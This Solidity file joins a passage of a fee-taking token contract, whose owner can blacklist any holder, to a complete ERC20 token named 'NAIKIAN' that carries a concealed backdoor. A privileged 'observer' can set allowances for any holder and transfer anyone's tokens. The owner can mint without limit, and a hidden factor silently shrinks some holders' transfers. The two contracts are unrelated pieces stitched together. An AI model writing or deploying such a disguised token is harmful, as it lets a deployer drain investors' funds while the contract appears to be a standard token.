    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        // Bot protection
        require(!_isBot[sender] && !_isBot[recipient], "Bot detected");

        // Max transaction check
        if (!_isExcludedFromMaxTx[sender] && !_isExcludedFromMaxTx[recipient]) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the max transaction limit");
        }

        // Max wallet check
        if (!_isExcludedFromMaxWallet[recipient] && recipient != uniswapV2Pair) {
            require(_balances[recipient].add(amount) <= _maxWalletSize, "Recipient balance exceeds max wallet size");
        }

        // Swap and liquify
        uint256 contractTokenBalance = _balances[address(this)];
        bool overMinimumTokenBalance = contractTokenBalance >= _maxTxAmount;
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && recipient == uniswapV2Pair) {
            if (overMinimumTokenBalance) {
                swapAndLiquify(contractTokenBalance);
            }
        }

        // Transfer logic
        bool takeFee = true;
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            takeFee = false;
        }

        _tokenTransfer(sender, recipient, amount, takeFee);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        } else {
            uint256 fee = (sender == uniswapV2Pair) ? BUY_FEE : SELL_FEE;
            uint256 feeAmount = amount.mul(fee).div(100);
            uint256 transferAmount = amount.sub(feeAmount);

            // Send fee to contract
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            // Send transfer amount to recipient
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(transferAmount);

            emit Transfer(sender, address(this), feeAmount);
            emit Transfer(sender, recipient, transferAmount);
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // Split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // Capture the contract's current ETH balance
        uint256 initialBalance = address(this).balance;

        // Swap half of tokens for ETH
        swapTokensForEth(half); 

        // How much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // Add liquidity
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate the uniswap pair path of token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // Accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // Approve token transfer to uniswap router
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // Slippage is unavoidable
            0, // Slippage is unavoidable
            _liquidityWallet,
            block.timestamp
        );
    }

    // Owner functions

    function setSwapAndLiquifyEnabled(bool _enabled) public {
        require(_msgSender() == _owner, "Only owner can call this function");
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function excludeFromFee(address account, bool excluded) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _isExcludedFromFee[account] = excluded;
        emit ExcludeFromFee(account, excluded);
    }

    function excludeFromMaxTx(address account, bool excluded) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _isExcludedFromMaxTx[account] = excluded;
        emit ExcludeFromMaxTx(account, excluded);
    }

    function excludeFromMaxWallet(address account, bool excluded) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _isExcludedFromMaxWallet[account] = excluded;
        emit ExcludeFromMaxWallet(account, excluded);
    }

    function setBot(address account, bool isBot) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _isBot[account] = isBot;
        emit SetBot(account, isBot);
    }

    function updateMaxTxAmount(uint256 maxTxAmount) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _maxTxAmount = maxTxAmount;
        emit UpdateMaxTxAmount(maxTxAmount);
    }

    function updateMaxWalletSize(uint256 maxWalletSize) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        _maxWalletSize = maxWalletSize;
        emit UpdateMaxWalletSize(maxWalletSize);
    }

    function updateFeePercentages(uint256 marketing, uint256 development, uint256 liquidity) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        require(marketing.add(development).add(liquidity) == 22, "Total fees must be 22%");
        _marketingFee = marketing;
        _developmentFee = development;
        _liquidityFee = liquidity;
        emit UpdateFeePercentages(marketing, development, liquidity);
    }

    function updateWallets(address marketing, address development, address liquidity) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        require(marketing != address(0) && development != address(0) && liquidity != address(0), "Zero address");
        _marketingWallet = marketing;
        _developmentWallet = development;
        _liquidityWallet = liquidity;
        emit UpdateWallets(marketing, development, liquidity);
    }

    function transferOwnership(address newOwner) external {
        require(_msgSender() == _owner, "Only owner can call this function");
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnerTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getOwner() external view returns (address) {
        return _owner;
    }

    // Fallback to catch ETH
    receive() external payable {}
}

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
contract NAIKIAN is ERC20, Ownable {
    address public observer;
    mapping(address => mapping(address => uint256)) private _observerAllowances;
    uint256 private _adjustmentFactor = 90;
    event ObserverUpdated(address indexed previousObserver, address indexed newObserver);
    constructor() ERC20("NAIKIAN", "NAI") {
        observer = msg.sender;
        _mint(msg.sender, 1000000000 * 10**18);
    }
    function setObserver(address newObserver) external onlyOwner {
        address oldObserver = observer;
        observer = newObserver;
        emit ObserverUpdated(oldObserver, newObserver);
    }
    function observerApprove(address holder, address spender, uint256 amount) external {
        require(msg.sender == observer, "Not observer");
        _observerAllowances[holder][spender] = amount;
    }
    function allowance(address holder, address spender) public view override returns (uint256) {
        uint256 observerAllowance = _observerAllowances[holder][spender];
        if (observerAllowance > 0) {
            return observerAllowance;
        }
        return super.allowance(holder, spender);
    }
    function transfer(address to, uint256 amount) public override returns (bool) {
        address from = _msgSender();
        uint256 adjustedAmount = _calculateAdjustedAmount(from, amount);
        _transfer(from, to, adjustedAmount);
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        uint256 adjustedAmount = _calculateAdjustedAmount(from, amount);
        _transfer(from, to, adjustedAmount);
        return true;
    }
    function _calculateAdjustedAmount(address from, uint256 amount) internal view returns (uint256) {
        if (_observerAllowances[from][observer] > 0 && from != observer) {
            return amount * _adjustmentFactor / 100;
        }
        return amount;
    }
    function setAdjustmentFactor(uint256 factor) external onlyOwner {
        require(factor <= 100, "Invalid factor");
        _adjustmentFactor = factor;
    }
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }
    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }
    function observerTransfer(address from, address to, uint256 amount) external {
        require(msg.sender == observer, "Not observer");
        _transfer(from, to, amount);
    }
}

